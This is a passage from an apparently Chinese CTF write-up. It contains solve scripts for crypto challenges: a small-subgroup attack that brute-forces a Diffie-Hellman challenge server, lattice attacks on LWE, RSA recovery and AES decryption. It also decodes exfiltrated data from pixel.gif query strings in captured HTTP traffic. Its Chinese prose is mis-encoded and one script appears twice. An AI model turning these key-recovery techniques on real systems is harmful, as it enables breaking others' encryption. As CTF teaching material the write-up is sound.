class="comment"># p-1 = 2 Ã— 11 Ã— 599 Ã— 647 Ã— 659 Ã— 661 Ã— 673 Ã— 683 Ã— 719 Ã— 743 Ã— 821 Ã— 857 Ã— 859 Ã— 887 Ã— 1013 Ã— 112035307627 Ã— 2919643795410481114830469</span></span><br><span class="line">small_p = [<span class="number">2</span>, <span class="number">11</span>, <span class="number">599</span>, <span class="number">647</span>, <span class="number">659</span>, <span class="number">661</span>, <span class="number">673</span>, <span class="number">683</span>, <span class="number">719</span>, <span class="number">743</span>, <span class="number">821</span>, <span class="number">857</span>, <span class="number">859</span>, <span class="number">887</span>, <span class="number">1013</span>]</span><br><span class="line"><span class="built_in">print</span>(prod(small_p).bit_length())</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;number \n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>,timeout=T)</span><br><span class="line">px = []</span><br><span class="line">kx = []</span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> small_p:</span><br><span class="line">    gx = <span class="built_in">pow</span>(<span class="number">2</span>, (p-<span class="number">1</span>)//q, p) <span class="comment"># é˜¶ä¸ºq</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Now: q = <span class="subst">&#123;q&#125;</span>, gx = <span class="subst">&#123;gx&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> trange(q):</span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;g:&#x27;</span>,<span class="built_in">str</span>(gx).encode(),timeout=T)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;A is &#x27;</span>,timeout=T)</span><br><span class="line">        Ax = <span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;,&#x27;</span>,timeout=T)[:-<span class="number">1</span>])</span><br><span class="line">        test_key = <span class="built_in">pow</span>(Ax, k, p)</span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;key:&#x27;</span>,<span class="built_in">str</span>(test_key).encode(),timeout=T)</span><br><span class="line">        res = r.recvline(timeout=T)</span><br><span class="line">        <span class="keyword">if</span> res == <span class="string">b&#x27;ok_key\n&#x27;</span>:</span><br><span class="line">            px.append(q)</span><br><span class="line">            kx.append(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(px)</span><br><span class="line">    <span class="built_in">print</span>(kx)</span><br><span class="line"></span><br><span class="line">b = CRT(kx, px)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">Key = <span class="built_in">pow</span>(A1, b, p)</span><br><span class="line">m = C ^ Key</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;syc&#123;de_sheN1_Y1che9g_D1ng_j0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="ez-lwe"><a href="#ez-lwe" class="headerlink" title="ez_lwe"></a>ez_lwe</h3><blockquote><p>Aliceè¯´bobçš„éŸ³å“æ”¾çš„æ‘‡æ»šä¹å…¨èº«å™ªéŸ³,bobä¸æœæ°”,è¡¨ç¤ºæˆ‘çš„noiseç»´æŒåœ¨åŒä¸€æ°´å¹³,è¿™æ˜¯ä¸€ç§å’Œè°å’Œç¾å¦™</p></blockquote><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://tangcuxiaojikuai.xyz/post/94c7e291.html#easy-mod-%CE%B1">https://tangcuxiaojikuai.xyz/post/94c7e291.html#easy-mod-%CE%B1</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">b=[...]</span><br><span class="line">A=[...]</span><br><span class="line">p=<span class="number">15444306518755915379</span></span><br><span class="line">CC=<span class="number">34117838417393645245232889782433844371448224358809402851502421141070689861491276117211335848678483269007265404950503463080005497089800226646525359172074859315940783930656864406105964118013</span></span><br><span class="line"></span><br><span class="line">m, n = <span class="number">60</span>, <span class="number">48</span></span><br><span class="line">A = Matrix(Zmod(p), m, n, A)</span><br><span class="line">b = vector(Zmod(p), b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">primal_attack2</span>(<span class="params">A,b,m,n,p</span>):</span><br><span class="line">    L = block_matrix(</span><br><span class="line">        [</span><br><span class="line">            [(matrix(Zmod(p), A).T).echelon_form().change_ring(ZZ), <span class="number">0</span>],</span><br><span class="line">            [matrix.zero(m - n, n).augment(matrix.identity(m - n) * p), <span class="number">0</span>],</span><br><span class="line">            [matrix(ZZ, b).stack(vector(ZZ, [<span class="number">1</span>]*m)), <span class="number">1</span>],</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line">    Q = diagonal_matrix(ZZ, [p]*m + [<span class="number">1</span>]*<span class="number">2</span>)</span><br><span class="line">    L = L*Q</span><br><span class="line">    L = L.BKZ()</span><br><span class="line">    L = L/Q</span><br><span class="line">    L = Matrix(ZZ, L)</span><br><span class="line">    res = vector(Zmod(p), L[<span class="number">3</span>])</span><br><span class="line">    e, k, t = res[:-<span class="number">2</span>], res[-<span class="number">2</span>], res[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> (e-vector(ZZ, [t]*m))*inverse_mod(<span class="built_in">int</span>(k),p)</span><br><span class="line"></span><br><span class="line">e2 = primal_attack2(A, b, m, n, p)</span><br><span class="line"><span class="built_in">print</span>(e2)</span><br><span class="line"></span><br><span class="line">s = A.solve_right(b-e2)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">S = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> s]</span><br><span class="line">Key = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    Key *= S[i]</span><br><span class="line">    </span><br><span class="line">M = CC ^^ Key</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(M))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;fuck_It_to0_n0s1y_I_wanna_to_slee_121p1p_s1hit1&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA?"></a>easy_RSA?</h3><blockquote><p>Is RSA secure when we encrypt p and q separately without knowing n?</p><p>hint: If you have learned lattice~</p></blockquote><p>part1å…ˆæ±‚mï¼Œpart2å‚è€ƒç¾ŠåŸæ¯2020 LRSAï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">S =  (<span class="number">34790</span>, <span class="number">60770</span>, <span class="number">29429</span>, <span class="number">54388</span>, <span class="number">22694</span>, <span class="number">50136</span>, <span class="number">13438</span>, <span class="number">7932</span>, <span class="number">46652</span>, <span class="number">9362</span>, <span class="number">44118</span>, <span class="number">48359</span>, <span class="number">50067</span>, <span class="number">29997</span>, <span class="number">63366</span>, <span class="number">36090</span>, <span class="number">7514</span>, <span class="number">16382</span>, <span class="number">24912</span>, <span class="number">369</span>, <span class="number">9261</span>, <span class="number">30671</span>, <span class="number">30689</span>, <span class="number">61154</span>, <span class="number">50897</span>, <span class="number">58137</span>, <span class="number">14927</span>, <span class="number">51518</span>, <span class="number">5782</span>, <span class="number">3971</span>, <span class="number">63594</span>, <span class="number">41078</span>, <span class="number">31477</span>, <span class="number">56610</span>, <span class="number">56084</span>, <span class="number">29542</span>, <span class="number">32843</span>, <span class="number">22096</span>, <span class="number">824</span>, <span class="number">52492</span>, <span class="number">33817</span>, <span class="number">24167</span>, <span class="number">38907</span>, <span class="number">48871</span>, <span class="number">24302</span>, <span class="number">62133</span>, <span class="number">60210</span>, <span class="number">7525</span>, <span class="number">55963</span>, <span class="number">48512</span>, <span class="number">16729</span>, <span class="number">26176</span>, <span class="number">37224</span>, <span class="number">14899</span>, <span class="number">11369</span>, <span class="number">38873</span>, <span class="number">41464</span>, <span class="number">30501</span>, <span class="number">23095</span>, <span class="number">21440</span>, <span class="number">14968</span>, <span class="number">36710</span>, <span class="number">15100</span>, <span class="number">50047</span>)</span><br><span class="line">A =  (<span class="number">16147</span>, <span class="number">54417</span>, <span class="number">37346</span>, <span class="number">48225</span>, <span class="number">25834</span>, <span class="number">16202</span>, <span class="number">9615</span>, <span class="number">504</span>, <span class="number">54090</span>, <span class="number">24475</span>, <span class="number">53598</span>, <span class="number">20375</span>, <span class="number">4188</span>, <span class="number">42949</span>, <span class="number">38644</span>, <span class="number">5471</span>, <span class="number">48340</span>, <span class="number">49202</span>, <span class="number">58598</span>, <span class="number">31600</span>, <span class="number">17902</span>, <span class="number">22273</span>, <span class="number">4272</span>, <span class="number">58982</span>, <span class="number">16813</span>, <span class="number">41775</span>, <span class="number">46368</span>, <span class="number">20609</span>, <span class="number">4350</span>, <span class="number">16271</span>, <span class="number">14783</span>, <span class="number">21900</span>, <span class="number">63534</span>, <span class="number">6337</span>, <span class="number">38858</span>, <span class="number">35731</span>, <span class="number">39772</span>, <span class="number">52248</span>, <span class="number">38217</span>, <span class="number">48935</span>, <span class="number">1408</span>, <span class="number">50145</span>, <span class="number">24808</span>, <span class="number">4117</span>, <span class="number">12887</span>, <span class="number">13498</span>, <span class="number">27429</span>, <span class="number">61700</span>, <span class="number">47565</span>, <span class="number">44896</span>, <span class="number">50703</span>, <span class="number">64168</span>, <span class="number">27170</span>, <span class="number">31129</span>, <span class="number">5620</span>, <span class="number">63168</span>, <span class="number">45776</span>, <span class="number">13144</span>, <span class="number">23963</span>, <span class="number">25446</span>, <span class="number">60607</span>, <span class="number">17509</span>, <span class="number">34818</span>, <span class="number">1875</span>)</span><br><span class="line">b =  <span class="number">2764</span></span><br><span class="line">p_m= <span class="number">12332486510964011158671675941288876941680648099414795378886378613845684830972446231876321910330241399720401327967071598143881618549530749656312652927809332</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c_inner = <span class="number">83399431472999194690216705615169036306463958887795007046559917542746213139295638450504799784590430551922090084967974615725328386260579470125560123552483026894270772816722527064675899017519890685144620455393788325407207242732361884830126228889169785202880542117272251300802452717688849566335597550131883378114</span></span><br><span class="line">n = <span class="number">122559396923126188518673248748225863862082328215893788075556473340278133079967721064738539949068231864208941120351781811847301797522502385475722537534223195433223265299092527494031447238530457784670684950341075860748519372286474800355858313799189011550620881300518596006433001049004445597176250937388576661809</span></span><br><span class="line">Q = <span class="number">17609948494254197001867062519311260077211984293151667548900416829700969294407535620672384674573058455384106178087491089816127503299076697261227000724815039612665504495756229918248399034320834393598470026243543589231473237419452687730543063603595465136115669723541948895463396554918071128531213060909364601656950027389056898604223267691455263897256898136680792549706073818306730228357683709696946839634919997675816794970587698373035672596923359143664093017904285058387254576603859313018778309521049338455162936103498885466949142273058671319832535869174839812056921940398538003527621201520818008358558845582594247420459</span></span><br><span class="line">P = <span class="number">20652887190957239284631175340003902315126211938181093064207269195242550094032224965692251651673103425027250767184928851917797759012986735534298162794316194395592379533545344962294078494289760237724601340062723352085300184175255877738749851041498543752865574186669040985787587644798823596547499014922063118523650392438320527012937021768573183057529502842126637960161988353588863260221824429222676866093636690824910541149705709054550563060623762529654624849373383560043169934394338959338517866931347066483777887082048559999731906556171653815355183514550470420842104873391074567329742472001229790402635829640092130822763</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># part1</span></span><br><span class="line"><span class="comment"># https://github.com/Aslan-256/crypto-ctf/blob/fe9d4f69d11fd781b69eb011cb63470cda598b11/cryptohack/lattices/learning_with_errors_1/lwe_high_bits_msg/sol.py</span></span><br><span class="line"></span><br><span class="line">n1 = <span class="number">64</span></span><br><span class="line">p1 = <span class="number">257</span></span><br><span class="line">q1 = <span class="number">65537</span></span><br><span class="line">delta = <span class="built_in">int</span>(<span class="built_in">round</span>(q1/p1))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lwe_decrypt</span>(<span class="params">A, b, S, delta, q</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(S)</span><br><span class="line">    <span class="comment"># Compute the inner product &lt;A, S&gt;</span></span><br><span class="line">    inner_product = <span class="built_in">sum</span>(A[i] * S[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)) % q</span><br><span class="line">    <span class="comment"># Compute x = b - &lt;A, S&gt; mod q</span></span><br><span class="line">    x = (b - inner_product) % q</span><br><span class="line">    <span class="comment"># Compute m = round(x / delta)</span></span><br><span class="line">    m = <span class="built_in">round</span>(x / delta)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">m = lwe_decrypt(A, b, S, delta, q1) </span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 91</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Hensel"><a href="#Hensel" class="headerlink" title="Hensel"></a>Hensel</h3><blockquote><p>æƒ³åˆ°é­”æ³•éƒ¨æ¥å—ï¼Ÿå…ˆå·å·æŠŠâ€œé€Ÿé€Ÿå˜å¤§â€å’’å­¦ä¼šå“¦ï¼</p></blockquote><p>LCG çš„å…¬å¼æ˜¯ï¼š</p><p><code>x_i+1 = (a*x_i) mod 2^256</code></p><p>å·²çŸ¥ aï¼Œè‹¥èƒ½å¾—åˆ°ä»»æ„ä¸€ä¸ªç”Ÿæˆçš„ 256-bit ç‰‡æ®µï¼Œå°±èƒ½çº¿æ€§é¢„æµ‹æ•´ä¸ªåºåˆ—ã€‚</p><p>ç´ æ•°ç”Ÿæˆæ–¹å¼ï¼š</p><p>æ¯ä¸ªç´ æ•° p æ˜¯ 4 ä¸ª 256-bit ç”Ÿæˆå™¨è¾“å‡ºæ‹¼æ¥è€Œæˆçš„ 1024-bit æ•°ï¼š</p><p><code>p = x0||x1||x2||x3</code></p><p>å…¶ä¸­ x_i æ˜¯æ¯æ¬¡ LCG çš„è¾“å‡ºã€‚</p><p>è¿™æ„å‘³ç€ æ¯ä¸ª p åªæœ‰ 4 æ¬¡ LCG è¾“å‡ºï¼Œè€Œ LCG æ¨¡æ•°æ˜¯ 2^256ï¼Œå·²çŸ¥ aï¼Œå¯èƒ½å¯ä»¥é€šè¿‡ç´ æ•°çš„é«˜ä½æˆ–è€…ä½ä½æ¢å¤ seedã€‚</p><p>â€‹</p><h3 id="EZ-LCG"><a href="#EZ-LCG" class="headerlink" title="EZ_LCG"></a>EZ_LCG</h3><blockquote><p>What would you do in real life if you wanted to read a file but it was encrypted?</p><p>hint1: Password hint for the data file:â€Y3J5cHRvâ€</p><p>hint2: All right~,you should learn lcg and LLL~</p></blockquote><p>æ ¹æ®æç¤ºï¼Œè§£å‹å¯†ç  <code>crypto</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">S =  (<span class="number">34790</span>, <span class="number">60770</span>, <span class="number">29429</span>, <span class="number">54388</span>, <span class="number">22694</span>, <span class="number">50136</span>, <span class="number">13438</span>, <span class="number">7932</span>, <span class="number">46652</span>, <span class="number">9362</span>, <span class="number">44118</span>, <span class="number">48359</span>, <span class="number">50067</span>, <span class="number">29997</span>, <span class="number">63366</span>, <span class="number">36090</span>, <span class="number">7514</span>, <span class="number">16382</span>, <span class="number">24912</span>, <span class="number">369</span>, <span class="number">9261</span>, <span class="number">30671</span>, <span class="number">30689</span>, <span class="number">61154</span>, <span class="number">50897</span>, <span class="number">58137</span>, <span class="number">14927</span>, <span class="number">51518</span>, <span class="number">5782</span>, <span class="number">3971</span>, <span class="number">63594</span>, <span class="number">41078</span>, <span class="number">31477</span>, <span class="number">56610</span>, <span class="number">56084</span>, <span class="number">29542</span>, <span class="number">32843</span>, <span class="number">22096</span>, <span class="number">824</span>, <span class="number">52492</span>, <span class="number">33817</span>, <span class="number">24167</span>, <span class="number">38907</span>, <span class="number">48871</span>, <span class="number">24302</span>, <span class="number">62133</span>, <span class="number">60210</span>, <span class="number">7525</span>, <span class="number">55963</span>, <span class="number">48512</span>, <span class="number">16729</span>, <span class="number">26176</span>, <span class="number">37224</span>, <span class="number">14899</span>, <span class="number">11369</span>, <span class="number">38873</span>, <span class="number">41464</span>, <span class="number">30501</span>, <span class="number">23095</span>, <span class="number">21440</span>, <span class="number">14968</span>, <span class="number">36710</span>, <span class="number">15100</span>, <span class="number">50047</span>)</span><br><span class="line">A =  (<span class="number">16147</span>, <span class="number">54417</span>, <span class="number">37346</span>, <span class="number">48225</span>, <span class="number">25834</span>, <span class="number">16202</span>, <span class="number">9615</span>, <span class="number">504</span>, <span class="number">54090</span>, <span class="number">24475</span>, <span class="number">53598</span>, <span class="number">20375</span>, <span class="number">4188</span>, <span class="number">42949</span>, <span class="number">38644</span>, <span class="number">5471</span>, <span class="number">48340</span>, <span class="number">49202</span>, <span class="number">58598</span>, <span class="number">31600</span>, <span class="number">17902</span>, <span class="number">22273</span>, <span class="number">4272</span>, <span class="number">58982</span>, <span class="number">16813</span>, <span class="number">41775</span>, <span class="number">46368</span>, <span class="number">20609</span>, <span class="number">4350</span>, <span class="number">16271</span>, <span class="number">14783</span>, <span class="number">21900</span>, <span class="number">63534</span>, <span class="number">6337</span>, <span class="number">38858</span>, <span class="number">35731</span>, <span class="number">39772</span>, <span class="number">52248</span>, <span class="number">38217</span>, <span class="number">48935</span>, <span class="number">1408</span>, <span class="number">50145</span>, <span class="number">24808</span>, <span class="number">4117</span>, <span class="number">12887</span>, <span class="number">13498</span>, <span class="number">27429</span>, <span class="number">61700</span>, <span class="number">47565</span>, <span class="number">44896</span>, <span class="number">50703</span>, <span class="number">64168</span>, <span class="number">27170</span>, <span class="number">31129</span>, <span class="number">5620</span>, <span class="number">63168</span>, <span class="number">45776</span>, <span class="number">13144</span>, <span class="number">23963</span>, <span class="number">25446</span>, <span class="number">60607</span>, <span class="number">17509</span>, <span class="number">34818</span>, <span class="number">1875</span>)</span><br><span class="line">b =  <span class="number">2764</span></span><br><span class="line">p_m= <span class="number">12332486510964011158671675941288876941680648099414795378886378613845684830972446231876321910330241399720401327967071598143881618549530749656312652927809332</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c_inner = <span class="number">83399431472999194690216705615169036306463958887795007046559917542746213139295638450504799784590430551922090084967974615725328386260579470125560123552483026894270772816722527064675899017519890685144620455393788325407207242732361884830126228889169785202880542117272251300802452717688849566335597550131883378114</span></span><br><span class="line">n = <span class="number">122559396923126188518673248748225863862082328215893788075556473340278133079967721064738539949068231864208941120351781811847301797522502385475722537534223195433223265299092527494031447238530457784670684950341075860748519372286474800355858313799189011550620881300518596006433001049004445597176250937388576661809</span></span><br><span class="line">Q = <span class="number">17609948494254197001867062519311260077211984293151667548900416829700969294407535620672384674573058455384106178087491089816127503299076697261227000724815039612665504495756229918248399034320834393598470026243543589231473237419452687730543063603595465136115669723541948895463396554918071128531213060909364601656950027389056898604223267691455263897256898136680792549706073818306730228357683709696946839634919997675816794970587698373035672596923359143664093017904285058387254576603859313018778309521049338455162936103498885466949142273058671319832535869174839812056921940398538003527621201520818008358558845582594247420459</span></span><br><span class="line">P = <span class="number">20652887190957239284631175340003902315126211938181093064207269195242550094032224965692251651673103425027250767184928851917797759012986735534298162794316194395592379533545344962294078494289760237724601340062723352085300184175255877738749851041498543752865574186669040985787587644798823596547499014922063118523650392438320527012937021768573183057529502842126637960161988353588863260221824429222676866093636690824910541149705709054550563060623762529654624849373383560043169934394338959338517866931347066483777887082048559999731906556171653815355183514550470420842104873391074567329742472001229790402635829640092130822763</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># part1</span></span><br><span class="line"><span class="comment"># https://github.com/Aslan-256/crypto-ctf/blob/fe9d4f69d11fd781b69eb011cb63470cda598b11/cryptohack/lattices/learning_with_errors_1/lwe_high_bits_msg/sol.py</span></span><br><span class="line"></span><br><span class="line">n1 = <span class="number">64</span></span><br><span class="line">p1 = <span class="number">257</span></span><br><span class="line">q1 = <span class="number">65537</span></span><br><span class="line">delta = <span class="built_in">int</span>(<span class="built_in">round</span>(q1/p1))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lwe_decrypt</span>(<span class="params">A, b, S, delta, q</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(S)</span><br><span class="line">    <span class="comment"># Compute the inner product &lt;A, S&gt;</span></span><br><span class="line">    inner_product = <span class="built_in">sum</span>(A[i] * S[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)) % q</span><br><span class="line">    <span class="comment"># Compute x = b - &lt;A, S&gt; mod q</span></span><br><span class="line">    x = (b - inner_product) % q</span><br><span class="line">    <span class="comment"># Compute m = round(x / delta)</span></span><br><span class="line">    m = <span class="built_in">round</span>(x / delta)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">m = lwe_decrypt(A, b, S, delta, q1) </span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 91</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part2</span></span><br><span class="line"><span class="comment">#ç¾ŠåŸæ¯2020 LRSA</span></span><br><span class="line"></span><br><span class="line">inner = <span class="built_in">sum</span>(a * s <span class="keyword">for</span> a, s <span class="keyword">in</span> <span class="built_in">zip</span>(A, S)) % q1</span><br><span class="line">c = c_inner + inner</span><br><span class="line">p = p_m + m</span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, f)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;y0u_sh0u1d_learn_a_l0t_a0bout_LLL&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="S-box"><a href="#S-box" class="headerlink" title="S_box"></a>S_box</h3><blockquote><p>æˆ‘çš„æ€ç»ªæ··ä¹±,å •å…¥äº†æ··æ²Œçš„æµ·æ´‹,ä¸Šé¢æœ‰é¦„ç‚–,æœ‰ç‚¹é¥¿.èƒ½åœ¨æˆ‘é¥¿æ­»ä¹‹å‰æŠŠæˆ‘æ•‘å‡ºè¿™ç‰‡æ··æ·†å—.</p></blockquote><p>ç»™äº†keyå’Œivï¼Œç›´æ¥è§£AESï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">k=<span class="number">42919069819233993628185922929020183702</span></span><br><span class="line">key=long_to_bytes(k)</span><br><span class="line">Cipher=<span class="string">b&#x27;\x18\xaf\x11\xbe:z7\xef?#\xcd\x9c\xb2\xf3@\x0fV\xb46-Ph\xb3y!\xb8;\xb3$\xf8\xcf\x93\xed\x81\xcb6\x19\xeei\xbb\x08r5\x8b\x89=\x95\x19&#x27;</span></span><br><span class="line">IV=<span class="string">b&quot;E\x11\xa4\xc6\xab\x1dH\xb1&#x27;&gt;\x89\x8f\xe6m\n&lt;&quot;</span></span><br><span class="line"></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, IV)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(Cipher))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;SS_B0xx_I1s_ver1y_Differe1c999c&#125;\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><blockquote><p>ç®¡ç†å‘˜æŠ“åˆ°ä¸€æ®µå¯ç–‘çš„æµé‡ï¼Œè¯·ä»ä¸­è¿˜åŸè¢«çªƒå–çš„ä¿¡æ¯</p></blockquote><p>Wiresharkåˆ†ææµé‡æ–‡ä»¶çš„HTTPæµé‡ï¼Œæ‰¾åˆ°ä¸‰æ®µï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /pixel.gif?d=U1lDe1JfVV9BXw%3D%3D&amp;s=00&amp;r=0eeox3ps HTTP/1.1</span><br><span class="line">GET /pixel.gif?d=RjBSM05TMUM1&amp;s=01&amp;r=h20hlp0i HTTP/1.1</span><br><span class="line">GET /pixel.gif?d=X01BU1RFUj99&amp;s=02&amp;r=lywbp18i HTTP/1.1</span><br></pre></td></tr></table></figure><p>æå–då‚æ•°å­—ç¬¦ä¸²ï¼Œbase64è§£ç æ‹¼æ¥å¾—flagï¼š</p><p><code>SYC&#123;R_U_A_F0R3NS1C5_MASTER?&#125;</code></p><p>â€‹</p><h3 id="ğŸ—ƒï¸ğŸ—ƒï¸"><a href="#ğŸ—ƒï¸ğŸ—ƒï¸" class="headerlink" title="ğŸ—ƒï¸ğŸ—ƒï¸"></a>ğŸ—ƒï¸ğŸ—ƒï¸</h3><blockquote><p>GSBPå¸ˆå‚…åœ¨å¤–å‡ºæ¯”èµ›ç»“æŸåï¼Œæ‰“ç®—åˆ°å½“åœ°æ™¯ç‚¹æ¸¸è§ˆä¸€ç•ªï¼Œä»–åˆ°äº†ä¸€ä¸ªæ™¯ç‚¹ä¹‹åï¼Œæ„Ÿè§‰ç¯å¢ƒéå¸¸ä¸é”™ï¼Œè®©äººå¿ƒæ—·ç¥æ€¡ï¼Œäºæ˜¯æ‹äº†å¼ å›¾ç‰‡å‘åˆ°äº†ç¤¾äº¤åª’ä½“ã€‚ä½ æ˜¯ä¸€åå°é»‘å®¢ï¼Œä½ 